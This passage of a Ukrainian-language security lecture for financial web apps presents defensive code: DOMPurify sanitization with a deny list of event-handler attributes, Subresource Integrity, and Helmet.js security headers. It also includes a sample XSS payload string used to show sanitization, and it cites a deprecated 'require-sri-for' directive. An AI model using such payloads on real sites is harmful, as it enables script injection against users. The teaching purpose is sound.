  script-src 'self' 'nonce-{random}';
  report-uri /api/csp-report;</code></pre>

        <h3>Санітизація HTML за допомогою DOMPurify</h3>
        <pre><code>// DOMPurify — безпечна санітизація HTML на клієнті
// Використовується коли потрібно відобразити HTML-контент
// (наприклад, повідомлення від клієнтів у адмін-панелі банку)

import DOMPurify from 'dompurify';

// ❌ НЕБЕЗПЕЧНО — пряме вставляння HTML
element.innerHTML = userInput;

// ✅ БЕЗПЕЧНО — санітизація через DOMPurify
element.innerHTML = DOMPurify.sanitize(userInput);

// Конфігурація DOMPurify для фінансового додатку (максимально сувора):
const cleanHTML = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'], // Мінімальний набір тегів
  ALLOWED_ATTR: [],         // Жодних атрибутів
  ALLOW_DATA_ATTR: false,   // Заборона data-* атрибутів
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
  FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover', 'onfocus']
});

// Приклад роботи:
const malicious = '&lt;p&gt;Привіт&lt;/p&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;' +
                  '&lt;img src=x onerror="steal()"&gt;';
const safe = DOMPurify.sanitize(malicious);
// Результат: '&lt;p&gt;Привіт&lt;/p&gt;'
// &lt;script&gt; та &lt;img onerror&gt; повністю видалені</code></pre>

        <h3>Перевірка цілісності підресурсів (SRI): захист від компрометації CDN</h3>
        <pre><code>&lt;!-- SRI — перевірка цілісності зовнішніх ресурсів --&gt;
&lt;!-- Якщо CDN скомпрометовано, браузер відмовиться завантажувати змінений файл --&gt;

&lt;!-- Підключення jQuery з CDN з перевіркою SRI --&gt;
&lt;script
  src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"
  integrity="sha384-1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5xXxAvs/HgeFs"
  crossorigin="anonymous"&gt;
&lt;/script&gt;

&lt;!-- Підключення CSS з SRI --&gt;
&lt;link
  rel="stylesheet"
  href="https://cdn.example.com/styles.css"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"&gt;

&lt;!-- Генерація SRI-хешу (у терміналі): --&gt;
&lt;!-- cat script.js | openssl dgst -sha384 -binary | openssl base64 -A --&gt;
&lt;!-- Або: shasum -b -a 384 script.js | awk '{ print $1 }' | xxd -r -p | base64 --&gt;

&lt;!-- Вимога SRI через CSP (блокує скрипти без integrity): --&gt;
&lt;!-- Content-Security-Policy: require-sri-for script style; --&gt;</code></pre>

        <h3>Повна конфігурація безпечних HTTP-заголовків за допомогою Helmet.js</h3>
        <pre><code>// Комплексна конфігурація безпечних заголовків для Express.js
// Helmet.js автоматизує встановлення усіх необхідних заголовків

const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// Генерація nonce для кожного запиту
app.use((req, res, next) =&gt; {
  res.locals.cspNonce = crypto.randomBytes(32).toString('base64');
  next();
});

// Комплексна конфігурація Helmet для банківського додатку
app.use((req, res, next) =&gt; {
  helmet({
    // Content Security Policy
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'none'"],
        scriptSrc: [`'nonce-${res.locals.cspNonce}'`, "'strict-dynamic'"],
        styleSrc: ["'self'", `'nonce-${res.locals.cspNonce}'`],
        imgSrc: ["'self'", "data:"],
        fontSrc: ["'self'"],
        connectSrc: ["'self'", "https://api.bank.com"],
        frameAncestors: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        reportUri: '/api/csp-report'
      }
    },
    // Strict Transport Security — примусовий HTTPS
    strictTransportSecurity: {
      maxAge: 31536000,       // 1 рік
      includeSubDomains: true,
      preload: true
    },
    // Захист від Clickjacking
    frameguard: { action: 'deny' },
    // Запобігання MIME-sniffing
    noSniff: true,
    // Referrer Policy
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
    // Permissions Policy — обмеження API браузера
    permittedCrossDomainPolicies: { permittedPolicies: 'none' }
  })(req, res, next);
});

// Додаткові заголовки, які Helmet не покриває
app.use((req, res, next) =&gt; {
  // Permissions-Policy (обмеження доступу до камери, мікрофона тощо)
  res.setHeader('Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=(self)');

  // Cross-Origin заголовки для ізоляції
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');

  next();
});

// Результуючі HTTP-заголовки відповіді:
// Content-Security-Policy: default-src 'none'; script-src 'nonce-abc123' ...
// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
// X-Frame-Options: DENY
// X-Content-Type-Options: nosniff
// Referrer-Policy: strict-origin-when-cross-origin
// Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(self)
// Cross-Origin-Opener-Policy: same-origin</code></pre>

        <div class="control-questions">
          <h3>Контрольні запитання</h3>
          <ol>
            <li>Поясніть різницю між whitelist-based та nonce-based CSP. Чому nonce-based підхід вважається більш надійним для захисту від XSS?</li>
            <li>Яким чином Subresource Integrity (SRI) захищає від formjacking-атак типу Magecart? Опишіть механізм перевірки.</li>
            <li>Чому output encoding повинен відповідати контексту виводу (HTML, JS, URL, CSS)? Наведіть приклад, коли HTML-encoding не захистить від XSS в JavaScript-контексті.</li>
            <li>Що таке довірені типи (Trusted Types) і як вони запобігають XSS на основі DOM на рівні платформи? Які приймачі (sinks) блокуються?</li>
            <li>Перелічіть мінімальний набір HTTP-заголовків безпеки для фінансового веб-додатку та поясніть роль кожного з них.</li>
          </ol>
        </div>
      </section>

      <!-- Summary -->
      <section>
        <h2>Підсумок</h2>
        <p>У цій лекції ми детально розглянули клієнтські атаки на фінансові веб-додатки. XSS у всіх його формах (Reflected, Stored, DOM-based) залишається однією з найпоширеніших і найнебезпечніших вразливостей — у фінансовому контексті це пряма загроза грошам клієнтів. CSRF дозволяє виконувати несанкціоновані транзакції від імені жертви, а клікджекінг маскує критичні дії під нешкідливі кліки.</p>
        <p>Атаки на клієнтське сховище та формджекінг демонструють, чому правильне управління токенами та ізоляція платіжних форм є критичними. Сучасний стек захисту — CSP, SRI, довірені типи (Trusted Types), заголовки безпеки та правильне екранування виводу — забезпечує багаторівневий захист від усього спектру клієнтських атак.</p>
        <p><strong>У наступній лекції</strong> ми розглянемо серверні вразливості та безпеку баз даних: SQL-ін'єкції, SSRF, XXE та методи захисту критичних даних фінансових систем.</p>
      </section>
    </article>

    <div class="lecture-nav-bottom">
      <a href="../../lecture.html?id=4" class="nav-btn">&larr; Назад до лекції</a>
      <span></span>
    </div>

    <footer></footer>
  </main>

  <script src="../../js/main.js"></script>

</body>
</html>
